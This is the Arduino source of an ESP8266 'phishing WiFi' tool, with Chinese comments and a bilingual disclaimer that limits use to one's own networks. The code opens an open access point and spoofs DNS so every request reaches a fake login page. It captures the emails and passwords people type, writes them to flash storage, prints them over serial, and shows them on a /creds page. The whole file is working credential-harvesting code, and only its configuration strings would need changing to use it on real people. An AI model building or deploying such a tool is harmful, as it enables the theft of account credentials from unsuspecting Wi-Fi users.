/***********************************************************
  项目名：钓鱼WIFI
  作者：BlackBox114
  当前版本描述：
  开发板：NodeMcu(ESP-12E)
  设备连接上热点后会收到强制弹出的WIFI登陆页面
  填写信息后会串口发送出去，并且返回到另一个页面
  连接热点后访问10.10.10.1也可直接访问钓鱼页面，或者访问10.10.10.1/creds获取钓鱼信息
  所有历史记录会保存在history.txt中
  修改人：BlackBox114
  修改时间：2019.4.9
  修改内容：增加直接从网页获得钓鱼信息的页面
  修改时间：2019.4.10
  修改内容：强制中文避免出现乱码
  修改时间：2019.4.17
  修改内容：新增文件储存功能，历史记录会保存在history.txt中
  接线：无
  /***********************************************************/
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>

// User configuration
#define SSID_NAME "姜太公"
#define SUBTITLE "这是个钓鱼wifi"
#define TITLE "愿者上钩："
#define BODY "这个网页会诱骗你输入你的账号和密码"
#define DATA "历史记录"
#define INFO "免责声明"
#define POST_TITLE "捕获中..."
#define POST_BODY "你刚刚输入的账户和密码已经被捕获，访问10.10.10.1/creds或直接点击鱼仓库链接可以看到捕获结果</br>愿者上钩"
#define LAWC "  该项目仅用于个人学习和研究使用。<br>ESP8266及其SDK都不是为此目的而设计或构建的。<br>可能会有 Bug 出现！请仅在自己的网络和设备上使用！<br>"
#define LAWE "  This project is a proof of concept for testing and educational purposes.<br>Neither the ESP8266, nor its SDK was meant or build for such purposes. <br>Bugs can occur!Use it only against your own networks and devices!<br>"
#define PASS_TITLE "鱼仓库"
#define CLEAR_TITLE "清除完成"

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(10, 10, 10, 1);

String Credentials = "";
String FISH  = "储存的密码和账号";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "</div><div class=q><a>&#169; BlackBox版权所有</a></div>";

}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"//不使用外联css，以后尝试将html和css还有图片放到NodeMCU闪存文件系统内
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #444444; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />"//强制中文
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:black\" href=/>回到钓鱼页面</a></p><p><a style=\"color:black\" href=/clear>清除捕获的信息</a></p><p><a style=\"color:black\" href=/data>前往数据页面</a></p><p><a style=\"color:black\" href=/info>前往声明页面</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=确认></form></center>" +
         "</ol><br><p><a style=\"color:black\" href=/info>免责声明</a></p>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>账号: <b>" + email + "</b></br>密码: <b>" + password + "</b></li>" + Credentials;

  history(email, password);         //把捕获到的消息用串口发出，并存进历史记录
  Serial.printf("连接此接入点上的无线终端数目 = %d\n", WiFi.softAPgetStationNum());
  Serial.println("");
  return header(POST_TITLE) + POST_BODY + "</ol><br><center><p><a style=\"color:black\" href=/creds>查看鱼仓库</a></p></center>" + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>捕获的信息已经清除</div></p><center><a style=\"color:black\" href=/>回到钓鱼页面</a></center>" + footer();
}

String data() {
  File myFile;
  myFile = SPIFFS.open("/history.txt", "r");//打开历史记录文件，"r"代表读取内容
  FISH = myFile.readString();
  myFile.close();
  return header(DATA) + "<div>"  + FISH + "</ol></div><div><form action=/creds method=creds>" + "<input type=submit value=返回鱼仓库></form></center>" + footer();
}

String info() {
  return header(INFO) + "<div>"  + LAWC + LAWE + "</ol></div><div><form action=/ method=/>" + "<input type=submit value=我已阅读并明白上述注意事项></form></center>" + footer();
}

void history(String email, String password) {
  Serial.println("愿者上钩");
  Serial.println(" ");
  Serial.println("捕获的邮箱：");
  Serial.println(email);
  Serial.println("捕获的密码：");
  Serial.println(password);
  Serial.println(" ");
  File myFile;
  //打开历史记录文件，"a"代表添加内容
  myFile = SPIFFS.open("/history.txt", "a");
  if (myFile) {
    Serial.println("正在将捕获数据存入历史记录...");
    myFile.println("捕获的邮箱：");
    myFile.println(email);
    myFile.println("捕获的密码：");
    myFile.println(password);
    Serial.println(" ");
    myFile.close();
    Serial.println("储存完成！");
  } else {
    Serial.println("无法将数据写入历史记录");
  }
  if (!SPIFFS.begin()) {
    Serial.println("文件闪存系统初始化失败，请检查烧录设置");
  }
  else {

    File myFile;
    Serial.println("正在读取更新后的历史记录");
    Serial.println(" = = = = = = = = = = = = = = = = =");
    myFile = SPIFFS.open("/history.txt", "r");//打开历史记录文件，"r"代表读取内容
    if (myFile) {
      Serial.println(myFile.readString());
      myFile.close();
      Serial.println(" = = = = = = = = = = = = = = = = =");
      Serial.println("更新后的历史记录读取完毕");
    } else {
      Serial.println("历史记录读取失败");
    }
  }
}

void BLINK() { // 有人上钩就闪两下

  digitalWrite(BUILTIN_LED, LOW);
  delay(500);
  digitalWrite(BUILTIN_LED, HIGH);
  delay(500);
}

void WELCOME() {
  Serial.println(" ");
  Serial.println(" = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =");
  Serial.println("||     ____     __                    __      ____                   ||");
  Serial.println("||    / __ )   / /  ____ _   _____   / /__   / __ )   ____     _  __ ||");
  Serial.println("||   / __  |  / /  / __ `/  / ___/  / //_/  / __  |  / __ \\   | |/_/ ||");
  Serial.println("||  / /_/ /  / /  / /_/ /  / /__   / ,<    / /_/ /  / /_/ /  _>  <   ||");
  Serial.println("|| /_____/  /_/   \\__,_/   \\___/  /_/|_|  /_____/   \\____/  /_/|_|   ||");
  Serial.println(" = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =");
  Serial.println("自动弹窗钓鱼热点启动");
  Serial.println("有人在页面内输入邮箱和密码后串口会返回捕获的邮箱和密码");
}

void setup() {
  Serial.begin(115200);
  Serial.println(" ");
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/info", []() {
    webServer.send(HTTP_CODE, "text/html", info());
  });
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });

  webServer.on("/data", []() {
    webServer.send(HTTP_CODE, "text/html", data());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
  WELCOME();
  if (!SPIFFS.begin()) {
    Serial.println("文件闪存系统初始化失败，请检查烧录设置");
  }
  else {
    Serial.println("文件系统已经启动，捕获的历史记录储存在NodeMCU 闪存文件系统中，可以显示在数据页面");
    File myFile;
    Serial.println("正在读取历史记录");
    Serial.println(" = = = = = = = = = = = = = = = = =");
    //打开文件 不存在就创建一个 可读可写
    myFile = SPIFFS.open("/history.txt", "r");
    if (myFile) {
      //读取文件内容
      Serial.println(myFile.readString());
      myFile.close();
      Serial.println(" = = = = = = = = = = = = = = = = =");
      Serial.println("读取完毕");
    } else {
      Serial.println("历史记录读取失败");
    }

  }
  Serial.println("连接热点后访问10.10.10.1也可直接访问钓鱼页面，或者访问10.10.10.1/creds获取钓鱼信息");
  Serial.println("正在等待客户端连接...");

}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
